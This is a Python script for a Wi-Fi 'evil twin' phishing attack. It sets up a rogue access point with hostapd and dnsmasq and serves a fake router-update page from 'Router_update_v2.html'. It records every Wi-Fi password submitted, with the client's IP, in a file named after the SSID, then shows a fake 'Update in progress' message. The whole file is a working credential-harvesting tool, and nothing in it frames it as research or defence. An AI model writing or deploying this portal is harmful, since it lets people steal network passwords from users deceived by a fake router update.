#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import netifaces
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import time
import socket
from datetime import datetime

# ==================== CONFIGURATION ====================
HTML_FILE = "Router_update_v2.html"
PORT = 80
CAPTIVE_PORTAL_SSID = ""
AP_STATIC_IP = "192.168.1.1/24"

# ==================== HTTP SERVER CLASS ====================
class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests - display login page"""
        print(f"[{datetime.now()}] GET request from {self.client_address[0]} to {self.path}")
        
        # Always redirect to login page
        try:
            with open(HTML_FILE, 'r', encoding='utf-8') as f:
                html_content = f.read()
        except FileNotFoundError:
            print(f"[{datetime.now()}] ERROR: HTML file not found: {HTML_FILE}")
            html_content = "<html><body><h1>Error: Portal page not found</h1></body></html>"
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', len(html_content.encode('utf-8')))
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def do_POST(self):
        """Handle POST requests - save password"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        password = ""
        for item in post_data.split('&'):
            if item.startswith('wifi_password='):
                password = item.split('=')[1]
                password = password.replace('+', ' ')
                if '%' in password:
                    import urllib.parse
                    password = urllib.parse.unquote(password)
        
        client_ip = self.client_address[0]
        print(f"[{datetime.now()}] New password from {client_ip}: {password}")
        
        # Save password to file
        if password and CAPTIVE_PORTAL_SSID:
            filename = f"{CAPTIVE_PORTAL_SSID}.txt"
            try:
                with open(filename, 'a', encoding='utf-8') as f:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] IP: {client_ip} | Password: {password}\n")
                print(f"[{datetime.now()}] Password saved to file: {filename}")
            except Exception as e:
                print(f"[{datetime.now()}] ERROR saving to file: {e}")
        
        # Response to client
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        response = "<html><body><h1>Thank you! Update in progress...</h1></body></html>"
        self.wfile.write(response.encode('utf-8'))

    def log_message(self, format, *args):
        """Silence standard logs"""
        pass

# ==================== HELPER FUNCTIONS ====================
def get_interface_info():
    """Get information about available network interfaces"""
    interfaces = netifaces.interfaces()
    interface_info = []
    
    print("\n" + "="*60)
    print("AVAILABLE NETWORK INTERFACES")
    print("="*60)
    
    for i, iface in enumerate(interfaces):
        try:
            # Get MAC address
            mac = netifaces.ifaddresses(iface).get(netifaces.AF_LINK, [{}])[0].get('addr', 'No MAC')
            
            # Get IP address
            ip_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [{}])
            ip = ip_info[0].get('addr', 'No IP') if ip_info else 'No IP'
            
            # Get chipset info (Linux/Unix)
            chipset = "Unknown"
            vendor = "Unknown"
            
            if sys.platform.startswith('linux'):
                try:
                    driver_path = f"/sys/class/net/{iface}/device/driver"
                    if os.path.exists(driver_path):
                        driver = os.path.basename(os.readlink(driver_path))
                        chipset = driver
                    
                    vendor_path = f"/sys/class/net/{iface}/device/vendor"
                    if os.path.exists(vendor_path):
                        with open(vendor_path, 'r') as f:
                            vendor_id = f.read().strip()
                        if vendor_id == '0x8086':
                            vendor = "Intel"
                        elif vendor_id == '0x10ec':
                            vendor = "Realtek"
                        elif vendor_id == '0x14e4':
                            vendor = "Broadcom"
                        else:
                            vendor = f"Vendor ID: {vendor_id}"
                    
                    device_path = f"/sys/class/net/{iface}/device/device"
                    if os.path.exists(device_path):
                        with open(device_path, 'r') as f:
                            device_id = f.read().strip()
                        chipset = f"{chipset} (Device: {device_id})"
                            
                except Exception:
                    chipset = "Read error"
            
            elif sys.platform == 'darwin':  # macOS
                try:
                    result = subprocess.run(['networksetup', '-listallhardwareports'], 
                                          capture_output=True, text=True)
                    for line in result.stdout.split('\n'):
                        if iface in line:
                            chipset = "Apple/Airport"
                except:
                    pass
            
            elif sys.platform == 'win32':  # Windows
                try:
                    result = subprocess.run(['wmic', 'nic', 'where', f'NetConnectionID="{iface}"', 
                                           'get', 'Manufacturer,Name', '/format:list'], 
                                          capture_output=True, text=True, 
                                          creationflags=subprocess.CREATE_NO_WINDOW)
                    for line in result.stdout.split('\n'):
                        if 'Manufacturer=' in line:
                            vendor = line.split('=')[1].strip()
                        elif 'Name=' in line:
                            chipset = line.split('=')[1].strip()
                except:
                    pass
            
            interface_info.append({
                'name': iface,
                'mac': mac,
                'ip': ip,
                'vendor': vendor,
                'chipset': chipset
            })
            
            print(f"{i+1}. {iface}")
            print(f"   MAC: {mac}")
            print(f"   IP: {ip}")
            print(f"   Vendor: {vendor}")
            print(f"   Chipset/driver: {chipset}")
            print(f"   {'-'*40}")
            
        except Exception as e:
            print(f"{i+1}. {iface} - Read error: {e}")
            print(f"   {'-'*40}")
    
    return interface_info

def start_captive_portal(interface, ssid):
    """Start captive portal on selected interface"""
    global CAPTIVE_PORTAL_SSID
    CAPTIVE_PORTAL_SSID = ssid
    
    print(f"\n{'='*60}")
    print(f"STARTING CAPTIVE PORTAL")
    print(f"{'='*60}")
    print(f"Interface: {interface}")
    print(f"SSID: {ssid}")
    print(f"Port: {PORT}")
    print(f"{'='*60}")
    
    try:
        # Get interface IP address
        server_ip = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        
        # Start server in separate thread
        server = HTTPServer((server_ip, PORT), CaptivePortalHandler)
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        print(f"\n✅ Captive portal started!")
        print(f"📡 Address: http://{server_ip}")
        print(f"⏱️  Start time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\nℹ️  Connection info will be displayed below:")
        print(f"{'='*60}\n")
        
        # Main loop
        while True:
            time.sleep(1)
            
    except KeyError:
        print(f"\n❌ No IP address assigned to interface {interface}")
        print("   Please assign an IP address first")
        sys.exit(1)
    except OSError as e:
        if e.errno == 98:
            print(f"\n❌ Port {PORT} is already in use")
            print("   Another service might be running on port 80")
            print("   Try: sudo fuser -k 80/tcp")
        else:
            print(f"\n❌ Server error: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n\n[{datetime.now()}] Stopping captive portal...")
        server.shutdown()
        print(f"[{datetime.now()}] Captive portal stopped")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Error starting server: {e}")
        sys.exit(1)

def get_default_interface():
    """Return the interface used for the default route (Linux)."""
    if not sys.platform.startswith('linux'):
        return None
    try:
        result = subprocess.run(
            ['ip', 'route', 'show', 'default'],
            capture_output=True,
            text=True,
            check=True,
        )
        for line in result.stdout.splitlines():
            parts = line.split()
            if 'dev' in parts:
                return parts[parts.index('dev') + 1]
    except (subprocess.CalledProcessError, IndexError):
        return None
    return None

def get_interface_for_ip(ip_address):
    """Return interface name for a given local IP."""
    for iface in netifaces.interfaces():
        ip_info = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
        for addr in ip_info:
            if addr.get('addr') == ip_address:
                return iface
    return None

def is_interface_used_for_ssh(interface):
    """Check if the interface appears to be used for the current SSH session."""
    ssh_conn = os.environ.get('SSH_CONNECTION')
    if not ssh_conn:
        return False
    parts = ssh_conn.split()
    if len(parts) < 3:
        return False
    local_ip = parts[2]
    return get_interface_for_ip(local_ip) == interface

def setup_wifi_ap(interface, ssid):
    """Configure interface as access point (Linux with hostapd)"""
    if not sys.platform.startswith('linux'):
        print(f"\n⚠️  Note: Automatic AP setup only available on Linux")
        print("   On other systems, configure hotspot manually")
        return True
    
    print(f"\nSetting up hotspot '{ssid}' on {interface}...")
    
    # Check if hostapd and dnsmasq are installed
    try:
        subprocess.run(['which', 'hostapd'], check=True, capture_output=True)
        subprocess.run(['which', 'dnsmasq'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print("\n❌ hostapd or dnsmasq not installed!")
        print("   Install with: sudo apt-get install hostapd dnsmasq")
        return False

    default_iface = get_default_interface()
    if default_iface == interface:
        print(f"\n❌ Safety check: {interface} is the default route interface.")
        print("   Configuring it as an AP would drop your SSH connection.")
        print("   Use a different interface for the access point.")
        return False

    if is_interface_used_for_ssh(interface):
        print(f"\n❌ Safety check: {interface} appears to be used for SSH.")
        print("   Configuring it as an AP would drop your SSH connection.")
        print("   Use a different interface for the access point.")
        return False
    
    try:
        # Detach interface from NetworkManager if available (avoid stopping NM)
        if subprocess.run(['which', 'nmcli'], capture_output=True).returncode == 0:
            subprocess.run(['sudo', 'nmcli', 'dev', 'set', interface, 'managed', 'no'],
                           capture_output=True)
        
        # Set static IP
        subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', interface])
        subprocess.run(['sudo', 'ip', 'addr', 'add', AP_STATIC_IP, 'dev', interface])
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'])
        
        # Create hostapd config
        hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        # Create dnsmasq config
        dnsmasq_conf = f"""interface={interface}
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,8.8.8.8
no-resolv
log-queries
log-dhcp
"""
        
        with open('/tmp/dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)
        
        # Start hostapd and dnsmasq in background
        print("Starting hostapd and dnsmasq...")
        subprocess.Popen(['sudo', 'hostapd', '/tmp/hostapd.conf'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(['sudo', 'dnsmasq', '-C', '/tmp/dnsmasq.conf'], 
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Enable packet forwarding
        subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'])
        if default_iface:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'POSTROUTING',
                           '-o', default_iface, '-j', 'MASQUERADE'])
        else:
            print("⚠️  Could not determine default route interface for NAT.")
            print("   Internet access for clients may not work.")
        
        print("✅ Hotspot configured!")
        return True
        
    except Exception as e:
        print(f"❌ Hotspot configuration error: {e}")
        return False

# ==================== MAIN FUNCTION ====================
def main():
    print("="*60)
    print("CAPTIVE PORTAL MANAGER")
    print("="*60)
    
    # Check if HTML file exists
    if not os.path.exists(HTML_FILE):
        print(f"\n❌ HTML file not found: {HTML_FILE}")
        print(f"   Place your {HTML_FILE} in the same directory as this script")
        print(f"   Or rename your HTML file to {HTML_FILE}")
        sys.exit(1)
    
    # 1. List interfaces
    interfaces = get_interface_info()
    
    if not interfaces:
        print("❌ No network interfaces found!")
        sys.exit(1)
    
    # 2. Select interface
    while True:
        try:
            choice = int(input(f"\nSelect interface (1-{len(interfaces)}): ")) - 1
            if 0 <= choice < len(interfaces):
                selected_iface = interfaces[choice]
                break
            else:
                print("❌ Invalid selection!")
        except ValueError:
            print("❌ Enter a number!")
    
    print(f"\n✅ Selected interface: {selected_iface['name']}")
    print(f"   {selected_iface['vendor']} - {selected_iface['chipset']}")
    
    # 3. Enter network name
    ssid = input("\nEnter network name (SSID) for captive portal: ").strip()
    if not ssid:
        ssid = f"UpdatePortal_{selected_iface['name']}"
        print(f"⚠️  Using default name: {ssid}")
    
    # 4. Configure hotspot (optional)
    setup_ap = input("\nConfigure interface as hotspot? (y/n): ").lower()
    if setup_ap == 'y':
        if not setup_wifi_ap(selected_iface['name'], ssid):
            print("⚠️  Continuing without hotspot configuration...")
    
    # 5. Start captive portal
    input("\nPress Enter to start captive portal...")
    start_captive_portal(selected_iface['name'], ssid)

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    # Check permissions (Linux/Unix)
    if os.name == 'posix' and os.geteuid() != 0:
        print("⚠️  Warning: Root permissions may be needed for network configuration")
        print("   Run with sudo, or configure interface manually")
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n[{datetime.now()}] Program terminated by user")
        sys.exit(0)
